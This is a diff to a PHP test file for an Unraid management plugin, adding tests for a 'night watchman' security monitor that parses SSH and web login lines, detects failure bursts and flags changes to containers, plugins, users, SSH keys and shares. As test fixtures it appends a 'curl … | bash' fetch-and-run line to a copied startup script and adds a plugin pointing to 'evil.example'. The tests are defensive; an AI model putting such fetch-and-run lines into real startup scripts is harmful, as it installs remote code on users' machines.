@@ -14,7 +14,8 @@ declare(strict_types=1);
  *            lead's «I know, thanks» and the Dashboard tile,
  *            Mr. Backupsy's packages and his Kopia per app and VM, a run skipped because
  *            the engine's lock was busy (and who holds it), Ms. Dustdevil's pictures,
- *            Mr. Restori's reader of the packages, the Consultant's monitoring externals, Ms. Protocolli's tour)
+ *            Mr. Restori's reader of the packages, the Consultant's monitoring externals, Ms. Protocolli's tour,
+ *            the night watchman's rounds, bursts, baseline and «I know, thanks»)
  *   hardening  the checks that keep requests, manifests, paths and links in
  *            bounds (PIN tries, safe writes, the mailbox, Ms. Dustdevil's
  *            manifests, Emby paths, anchored validators, the release link)
@@ -868,6 +869,275 @@ function testLogsTour(): void
     ksort($names);
     ksort($want);
     same("logs: desk.js LEVEL_NAMES are the agent's", $want, $names);
+}
+
+/**
+ * The night watchman: his login lines, bursts of failures, the syslog by
+ * offset and rotation, rights and plugin sources, and a whole watch on copies
+ * — taking over (nothing reported), a night with changes (one entry each,
+ * one notification per kind), «I know, thanks» (the new normal), the team
+ * lead's note, hired anew.
+ */
+function testWatchman(): void
+{
+    $now = strtotime('2026-10-06 12:00:00');
+    $known = ['root' => true, 'benj' => true];
+    $p = fn (string $l) => watchmanParseLine($l, $known, $now);
+    $pick = fn (?array $e, array $keys) => $e === null ? null : array_map(fn ($k) => $e[$k], $keys);
+
+    // lines: Unraid's web login (dynamix/include/.login.php) and SSH
+    same('watch line: web login', [true, 'web', 'root', '192.168.7.125', strtotime('2026-10-06 11:58:01')],
+        $pick($p('Oct  6 11:58:01 Tower webgui: Successful login user root from 192.168.7.125'), ['ok', 'service', 'user', 'ip', 'time']));
+    same('watch line: web failure with its cooldown', [false, 'root', '192.168.7.66'],
+        $pick($p('Oct  6 11:58:02 Tower webgui: Unsuccessful login user root from 192.168.7.66. Ignoring login attempts for 900 seconds.'), ['ok', 'user', 'ip']));
+    same('watch line: what was typed as the name is never the address, nor kept unless a user', [false, null, '10.0.0.5'],
+        $pick($p('Oct  6 11:58:03 Tower webgui: Unsuccessful login user hunter2 from 9.9.9.9 from 10.0.0.5. '), ['ok', 'user', 'ip']));
+    same('watch line: SSH with a key', [true, 'ssh:publickey', 'root', '192.168.7.219'],
+        $pick($p('Oct  6 11:59:00 Tower sshd-session[2347524]: Accepted publickey for root from 192.168.7.219 port 59009 ssh2: RSA SHA256:abc'), ['ok', 'service', 'user', 'ip']));
+    same('watch line: SSH password failed', [false, 'ssh:password', 'root', '203.0.113.9'],
+        $pick($p('Oct  6 11:59:01 Tower sshd[123]: Failed password for root from 203.0.113.9 port 4242 ssh2'), ['ok', 'service', 'user', 'ip']));
+    same('watch line: "Failed … for invalid user" counts through its "Invalid user" line', null,
+        $p('Oct  6 11:59:02 Tower sshd[123]: Failed password for invalid user admin from 203.0.113.9 port 4243 ssh2'));
+    same('watch line: invalid user, the name not kept', [false, null, '203.0.113.9'],
+        $pick($p('Oct  6 11:59:02 Tower sshd[123]: Invalid user admin from 203.0.113.9 port 4243'), ['ok', 'user', 'ip']));
+    same('watch line: IPv4 inside IPv6', '192.168.7.5', $p('Oct  6 11:59:03 Tower sshd-session[9]: Accepted password for root from ::ffff:192.168.7.5 port 1 ssh2')['ip'] ?? null);
+    same('watch line: other lines are none', [null, null, null], [
+        $p('Oct  6 11:59:04 Tower sshd-session[9]: Postponed publickey for root from 1.2.3.4 port 5 ssh2 [preauth]'),
+        $p('Oct  6 11:59:04 Tower webgui: TimeMachine: Could not download icon /boot/config/plugins/dockerMan/images/x.png'),
+        $p('Oct  6 11:59:04 Tower webgui: Successful login user root from not-an-address')]);
+    same('watch time: December read in January', '2025-12-31 23:59:00',
+        date('Y-m-d H:i:s', (int) watchmanLineTime('Dec 31 23:59:00 Tower x', strtotime('2026-01-01 00:10:00'))));
+
+    // bursts: WATCH_FAIL_BURST failures from one address within WATCH_FAIL_WINDOW
+    $fail = fn (int $t, ?string $u = 'root', string $ip = '203.0.113.9') => ['ok' => false, 'service' => 'ssh:password', 'user' => $u, 'ip' => $ip, 'time' => $t];
+    $fails = [];
+    $adds = [];
+    foreach ([0, 60, 120, 180] as $t) {
+        $adds[] = watchmanFailStep($fails, $fail($now + $t));
+    }
+    $adds[] = watchmanFailStep($fails, $fail($now + 240, null));
+    $adds[] = watchmanFailStep($fails, $fail($now + 300));
+    same('watch burst: four are nothing, the fifth starts it with all five, then one each', [0, 0, 0, 0, 5, 1], $adds);
+    same('watch burst: names tried (users only) and unknown ones counted', [['root'], 1], [$fails['203.0.113.9']['users'], $fails['203.0.113.9']['unknown']]);
+    same('watch burst: a pause longer than the window starts anew', 0, watchmanFailStep($fails, $fail($now + 301 + WATCH_FAIL_WINDOW)));
+    $slow = [];
+    $n = 0;
+    foreach (range(0, 9) as $i) {
+        $n += watchmanFailStep($slow, $fail($now + $i * 200, 'root', '198.51.100.1'));
+    }
+    same('watch burst: ten failures 200 s apart are no burst', 0, $n);
+
+    // the syslog by offset; rotated: the rest of syslog.1 (by inode), then the new one; nothing twice
+    $tmp = sys_get_temp_dir() . '/office-tests-watch-' . getmypid();
+    @mkdir($tmp, 0700, true);
+    $log = "$tmp/syslog";
+    file_put_contents($log, "Oct  6 10:00:00 Tower webgui: Successful login user root from 192.168.7.10\nOct  6 10:00:01 Tower kernel: x\n");
+    [$ev, $pos] = watchmanReadLogins($log, null, true, $known, $now);
+    same('watch read: taking over reads all of it', [['192.168.7.10'], filesize($log)], [array_column($ev, 'ip'), $pos['size']]);
+    [$ev, $pos2] = watchmanReadLogins($log, null, false, $known, $now);
+    same('watch read: without a position, from now on', [[], filesize($log)], [$ev, $pos2['size']]);
+    file_put_contents($log, "Oct  6 10:01:00 Tower webgui: Successful login user root from 192.168.7.11\n"
+        . 'Oct  6 10:01:01 Tower webgui: Successful login user root from 192.168.7.12', FILE_APPEND);
+    [$ev, $pos] = watchmanReadLogins($log, $pos, false, $known, $now);
+    same('watch read: only what came, whole lines', ['192.168.7.11'], array_column($ev, 'ip'));
+    rename($log, "$log.1");
+    file_put_contents("$log.1", "\n", FILE_APPEND);
+    file_put_contents($log, "Oct  6 10:02:00 Tower sshd[1]: Accepted publickey for root from 192.168.7.13 port 1 ssh2\n");
+    [$ev, $pos, $info] = watchmanReadLogins($log, $pos, false, $known, $now);
+    same('watch read: rotated — the rest of the old file, then the new one', [true, ['192.168.7.12', '192.168.7.13']],
+        [$info['rotated'], array_column($ev, 'ip')]);
+    same('watch read: nothing twice', [], watchmanReadLogins($log, $pos, false, $known, $now)[0]);
+    exec('rm -rf ' . escapeshellarg($tmp));
+
+    // rights as docker run flags; a plugin's source from its own entities
+    same('watch rights', ['--cap-add=SYS_ADMIN', '--device=/dev/fuse', '--network=host', '--privileged', '-p 127.0.0.1:8080:80/tcp', '-p 9090/tcp', '-v /var/run/docker.sock'],
+        watchmanContainerTokens(['Privileged' => true, 'NetworkMode' => 'host', 'PidMode' => '', 'CapAdd' => ['CAP_SYS_ADMIN'],
+            'Devices' => [['PathOnHost' => '/dev/fuse']], 'PortBindings' => ['80/tcp' => [['HostIp' => '127.0.0.1', 'HostPort' => '8080']], '9090/tcp' => [['HostIp' => '', 'HostPort' => '']]]],
+            [['Type' => 'bind', 'Source' => '/var/run/docker.sock'], ['Type' => 'bind', 'Source' => '/mnt/user/appdata/x']]));
+    same('watch rights: published ports alone are none', [], watchmanRights(['-p 80:80/tcp']));
+    $plg = "<!ENTITY name \"filesviewer\">\n<!ENTITY branch \"main\">\n<!ENTITY version \"2026.08.24\">\n"
+         . "<!ENTITY pluginURL \"https://github.com/x/releases/download/&version;/&name;.txz\">\n"
+         . "<!ENTITY selfURL \"https://raw.githubusercontent.com/Lazaros-Chalkidis/unraid-filesviewer/&branch;/&name;.plg\">\n"
+         . "<PLUGIN name=\"&name;\" version=\"&version;\"\n        pluginURL=\"&selfURL;\" launch=\"x\">";
+    same('watch plugin: the <PLUGIN> attribute, entities resolved', ['https://raw.githubusercontent.com/Lazaros-Chalkidis/unraid-filesviewer/main/filesviewer.plg', '2026.08.24'],
+        watchmanPluginUrl($plg));
+    same('watch plugin: source with the owner on code hosts', ['raw.githubusercontent.com/Lazaros-Chalkidis', 'stable.dl.unraid.net', ''],
+        [watchmanSource(watchmanPluginUrl($plg)[0]), watchmanSource('https://stable.dl.unraid.net/x.plg'), watchmanSource(null)]);
+
+    // a whole watch, on copies
+    $tmp = sys_get_temp_dir() . '/office-tests-watch-' . getmypid();
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    $history = $line($now - 7200, 'webgui: Successful login user root from 192.168.7.10');
+    foreach (range(0, 5) as $i) {      // a client that keeps failing (it had a burst before he came)
+        $history .= $line($now - 5000 + $i, 'webgui: Unsuccessful login user root from 192.168.7.66. ');
+    }
+    file_put_contents($paths['syslog'], $history);
+    $plgFile = fn (string $owner) => "<!ENTITY name \"ca\">\n<!ENTITY github \"$owner/ca\">\n"
+        . "<!ENTITY pluginURL \"https://raw.githubusercontent.com/&github;/master/&name;.plg\">\n<PLUGIN name=\"&name;\" version=\"1\" pluginURL=\"&pluginURL;\">\n";
+    file_put_contents("$src/plugins/ca.plg", $plgFile('unraid'));
+    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
+    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\nbenj:x:1000:100::/:/bin/false\n");
+    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n" . 'benj:$6$cc$dd:20000:0:99999:7:::' . "\n");
+    $key = fn (string $c) => 'ssh-ed25519 ' . base64_encode("\0\0\0\x0bssh-ed25519\0\0\0\x20" . random_bytes(32)) . " $c";
+    file_put_contents("$src/ssh/root/authorized_keys", $key('benj@mac') . "\n");
+    $sec = fn (string $media) => "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n[\"Media\"]\nexport=\"$media\"\nsecurity=\"public\"\n[\"flash\"]\nexport=\"-\"\nsecurity=\"public\"\n";
+    file_put_contents($paths['sec'], $sec('-'));
+    file_put_contents($paths['sec_nfs'], "[\"appdata\"]\nexport=\"-\"\nsecurity=\"public\"\n");
+    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\nshareNFSEnabled=\"no\"\n");
+    $containers = ['kopia' => ['image' => 'kopia', 'tokens' => ['--cap-add=SYS_ADMIN']], 'plex' => ['image' => 'plex', 'tokens' => ['-p 32400:32400/tcp']]];
+    $docker = function () use (&$containers) {
+        return $containers;
+    };
+    $acks = "$tmp/acks.json";
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    $calls = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
+    $open = fn () => array_count_values(array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), 'kind'));
+
+    $r = watchmanRound($paths, $data, 1000, $now, $docker, true, $acks);
+    $d = watchmanLoad($data);
+    same('watch: the first round takes over and reports nothing', [true, [], [], 0], [$r['fresh'], $r['added'], $open(), count($calls())]);
+    same('watch: what is normal now', [['192.168.7.10'], ['192.168.7.66'], ['kopia', 'plex'], ['ca' => 'raw.githubusercontent.com/unraid'], ['root', 'benj'], 1, ['Media', 'appdata', 'flash']],
+        [array_keys($d['baseline']['ips']), array_keys($d['baseline']['fail_ips']), array_keys($d['baseline']['containers']),
+         array_map(fn ($x) => $x['source'], $d['baseline']['plugins']), $d['baseline']['flash']['users'], count($d['baseline']['flash']['keys']['root']),
+         array_keys($d['baseline']['shares'])]);
+    same('watch: one line in the book that he took over', ['watch'], array_column($d['book'], 'kind'));
+    check('watch: never a password field in his files', !str_contains((string) file_get_contents("$data/baseline.json") . file_get_contents("$data/seen.json"), '$6$'));
+    same('watch: the team lead hears "quiet"', [['quiet', true]], array_map(fn ($f) => [$f['id'], $f['ok']], watchmanChecks($data)));
+
+    // the night: what differs
+    $t = $now + 300;
+    $night = $line($t, 'webgui: Successful login user root from 10.9.8.7')
+           . $line($t, 'sshd-session[5]: Accepted publickey for root from 192.168.7.10 port 2 ssh2: ED25519 SHA256:x');
+    foreach (range(0, 5) as $i) {
+        $night .= $line($t + $i, 'sshd[7]: Failed password for root from 203.0.113.9 port ' . (4000 + $i) . ' ssh2');
+        $night .= $line($t + $i, 'webgui: Unsuccessful login user root from 192.168.7.66. ');
+    }
+    file_put_contents($paths['syslog'], $night, FILE_APPEND);
+    $containers['plex']['tokens'] = ['--privileged', '-p 32400:32400/tcp', '-p 8080:80/tcp'];
+    $containers['kopia']['tokens'] = [];
+    $containers['vpn'] = ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host']];
+    $containers['web'] = ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']];
+    file_put_contents("$src/plugins/ca.plg", $plgFile('someone'));
+    file_put_contents("$src/plugins/evil.plg", "<PLUGIN name=\"evil\" version=\"1\" pluginURL=\"https://evil.example/evil.plg\">\n");
+    file_put_contents($paths['go'], "curl -s https://example.com/x | bash\n", FILE_APPEND);
+    file_put_contents("$src/extra/tool.txz", 'x');
+    file_put_contents($paths['passwd'], "eve:x:1001:100::/:/bin/false\n", FILE_APPEND);
+    file_put_contents($paths['shadow'], 'root:$6$ee$ff:20001:0:99999:7:::' . "\n" . 'benj:$6$cc$dd:20000:0:99999:7:::' . "\n" . 'eve:$6$gg$hh:20001:0:99999:7:::' . "\n");
+    file_put_contents("$src/ssh/root/authorized_keys", $key('someone@else') . "\n", FILE_APPEND);
+    file_put_contents($paths['sec'], $sec('e'));
+    $r = watchmanRound($paths, $data, 1000, $now + 600, $docker, true, $acks);
+    $kinds = $open();
+    ksort($kinds);
+    same('watch: one entry for each thing that differs', ['container_new' => 1, 'container_ports' => 1, 'container_privileged' => 1,
+        'flash_extra' => 1, 'flash_go' => 1, 'flash_password' => 1, 'flash_ssh_key' => 1, 'flash_user' => 1, 'login_failures' => 1,
+        'login_new_ip' => 1, 'plugin_new' => 1, 'plugin_source' => 1, 'share_public' => 1], $kinds);
+    $d = watchmanLoad($data);
+    $by = array_column(array_filter($d['book'], 'watchmanOpen'), null, 'kind');
+    same('watch: the burst — how many, who', [6, ['root'], '203.0.113.9'], [$by['login_failures']['count'], $by['login_failures']['p']['users'], $by['login_failures']['p']['ip']]);
+    same('watch: an address known for failing is counted, not reported', 6, $d['baseline']['fail_ips']['192.168.7.66']['quiet'] ?? null);
+    same('watch: fewer rights are the new normal', [], $d['baseline']['containers']['kopia']['tokens']);
+    same('watch: a new container with only ports is normal', ['-p 80:80/tcp'], $d['baseline']['containers']['web']['tokens'] ?? null);
+    same('watch: rights as flags, the plugin source moved', ['--privileged', 'raw.githubusercontent.com/someone', 'raw.githubusercontent.com/unraid', ['added' => 1, 'removed' => 0]],
+        [watchmanText($by['container_privileged'])['rights'], $by['plugin_source']['p']['source'], $by['plugin_source']['p']['old'], watchmanText($by['flash_go'])]);
+    $c = $calls();
+    same('watch: one notification per important kind (ports only in the book)', 12, count($c));
+    $lang = officeNotifyLang();
+    check('watch: the notification in Unraid\'s language',
+        str_contains(implode("\n", $c), OFFICE_NOTIFY_EVENT . ': ' . officeNotifyText('watchman', 'notify.login_failures', ['n' => 1] + watchmanText($by['login_failures']), $lang)));
+    $f = array_column(watchmanChecks($data), null, 'id');
+    same('watch: the team lead gets one finding per kind, recommended, with the newest', [13, 'recommended', false, 1, '10.9.8.7'],
+        [count($f), $f['login_new_ip']['level'], $f['login_new_ip']['ok'], $f['login_new_ip']['params']['n'], $f['login_new_ip']['params']['ip']]);
+
+    // the same again, the burst going on: no new entry, nothing told again
+    file_put_contents($paths['syslog'], $line($t + 30, 'sshd[7]: Failed password for root from 203.0.113.9 port 4999 ssh2'), FILE_APPEND);
+    $r = watchmanRound($paths, $data, 1000, $now + 900, $docker, true, $acks);
+    same('watch: seen again — nothing new, the burst counts on, nobody told twice', [[], 7, 12],
+        [$r['added'], array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), null, 'kind')['login_failures']['count'], count($calls())]);
+
+    // «I know, thanks»: one, then the rest — the new normal
+    $id = $by['container_privileged']['id'];
+    watchmanAck($id, $data, $now + 1000, false);
+    same('watch ack: the container\'s new right is normal now', true, in_array('--privileged', watchmanLoad($data)['baseline']['containers']['plex']['tokens'], true));
+    try {
+        watchmanAck($id, $data, $now + 1001, false);
+        check('watch ack: twice is refused', false);
+    } catch (Problem $e) {
+        same('watch ack: twice is refused', 'watch_gone', $e->key);
+    }
+    // the team lead noted the plugin finding: here it counts as noted too
+    $plugin = array_column(watchmanChecks($data), null, 'id')['plugin_new'];
+    file_put_contents($acks, json_encode(['acks' => [caretakerAckSig('watchman', $plugin) => ['desk' => 'watchman', 'id' => 'plugin_new', 'time' => $now, 'seen' => $now]]]));
+    $r = watchmanRound($paths, $data, 1000, $now + 1200, $docker, true, $acks);
+    $d = watchmanLoad($data);
+    same('watch: the team lead\'s note counts here too', ['teamlead', 'evil.example'],
+        [array_column($d['book'], null, 'kind')['plugin_new']['by'] ?? null, $d['baseline']['plugins']['evil']['source'] ?? null]);
+    watchmanAck('*', $data, $now + 1300, false);
+    same('watch ack: all noted, nothing open', [], $open());
+    $r = watchmanRound($paths, $data, 1000, $now + 1500, $docker, true, $acks);
+    same('watch: after noting, the same state reports nothing', [[], []], [$r['added'], $open()]);
+    $b = watchmanLoad($data)['baseline'];
+    same('watch: noted is normal (address, share, user, key, go)', [true, 2, true, 2, 3],
+        [isset($b['ips']['10.9.8.7']), $b['shares']['Media']['smb'], in_array('eve', $b['flash']['users'], true), count($b['flash']['keys']['root']),
+         count($b['flash']['go']['lines'])]);
+
+    // a new burst within the hour after the last message: in the book, told only later
+    $before = count($calls());
+    file_put_contents($paths['syslog'], implode('', array_map(fn ($i) => $line($now + 1600 + $i, "sshd[8]: Invalid user x$i from 198.51.100.7 port $i"), range(0, 4))), FILE_APPEND);
+    $r = watchmanRound($paths, $data, 1000, $now + 1700, $docker, true, $acks);
+    same('watch notify: within the quiet hour — in the book, not told yet', [['login_failures'], $before], [$r['added'], count($calls())]);
+    $r = watchmanRound($paths, $data, 1000, $now + 300 + 600 + WATCH_NOTIFY_QUIET, $docker, true, $acks);
+    same('watch notify: after the hour — told', [[['kind' => 'login_failures', 'n' => 1, 'sent' => true]], $before + 1], [$r['told'], count($calls())]);
+
+    // the page and the metrics: newest first, no internals
+    $page = watchmanPageState($data, $now + 5000, false);
+    check('watch page: newest first', $page['book'][0]['last'] >= end($page['book'])['last']);
+    check('watch page: no internal values', !str_contains(json_encode($page), '"_h"'));
+    $failing = array_column($page['watch']['fail_ips'], 'ip');
+    sort($failing);
+    same('watch page: what he keeps an eye on', [2, ['192.168.7.66', '203.0.113.9'], ['Media']],
+        [count($page['watch']['ips']), $failing, array_column($page['watch']['shares']['open'], 'share')]);
+    $m = watchmanMetrics($data);
+    same('watch metrics: open per kind, the last round', ['uso_watchman_open_findings', count(WATCH_KINDS), 1, 'uso_watchman_last_round_timestamp_seconds', $now + 300 + 600 + WATCH_NOTIFY_QUIET],
+        [$m[0]['name'], count($m[0]['samples']), array_column(array_map(fn ($s) => [$s[0]['kind'], $s[1]], $m[0]['samples']), 1, 0)['login_failures'], $m[1]['name'], $m[1]['samples'][0][1]]);
+
+    // hired anew: a new look at what is normal, what was open is closed
+    $r = watchmanRound($paths, $data, 2000, $now + 9000, $docker, true, $acks);
+    $d = watchmanLoad($data);
+    same('watch: hired anew — taken over again, nothing open', [true, [], 2, 'baseline'],
+        [$r['fresh'], $open(), count(array_filter($d['book'], fn ($e) => $e['kind'] === 'watch')), array_column($d['book'], null, 'kind')['login_failures']['by'] ?? null]);
+
+    // the book keeps WATCH_BOOK_MAX entries, open ones first
+    $book = [];
+    foreach (range(1, WATCH_BOOK_MAX + 10) as $i) {
+        $book[] = ['noted' => $now] + watchmanEntry('flash_user', "flash_user:u$i", $now, ['user' => "u$i"]);
+    }
+    $book[] = watchmanEntry('flash_go', 'flash_go', $now, []);
+    $kept = watchmanPrune($book, $now + 60);
+    same('watch book: capped, the open one kept', [WATCH_BOOK_MAX, 1], [count($kept), count(array_filter($kept, 'watchmanOpen'))]);
+    same('watch book: noted ones go after their days', 1, count(watchmanPrune($book, $now + WATCH_BOOK_DAYS * 86400 + 1)));
+
+    // every kind has its texts
+    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/lang/en.json'), true) ?: [];
+    foreach (array_keys(WATCH_KINDS) as $kind) {
+        foreach (["check.$kind", "check.{$kind}_how", "entry.$kind", "notify.$kind", "adopt.$kind"] as $k) {
+            check("watchman: text $k", isset($en[$k]));
+        }
+    }
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($data, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
 }
 
 // ===================================================================== notifications
@@ -1909,7 +2179,7 @@ function testIconSquare(): void
 // ===================================================================== run
 
 $parts = ['logic' => ['testCron', 'testRetention', 'testSnapshotNames', 'testEmby', 'testUserScripts', 'testOfficeCron', 'testMenuName', 'testEstimates', 'testNotify', 'testCaretakerAcks',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testAdvisor', 'testLogsTour', 'testMetrics'],
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testAdvisor', 'testLogsTour', 'testMetrics', 'testWatchman'],
           'hardening' => ['testPinTries', 'testSafeWrites', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean'],
           'strings' => ['testStrings']];
 $only = $argv[1] ?? '';
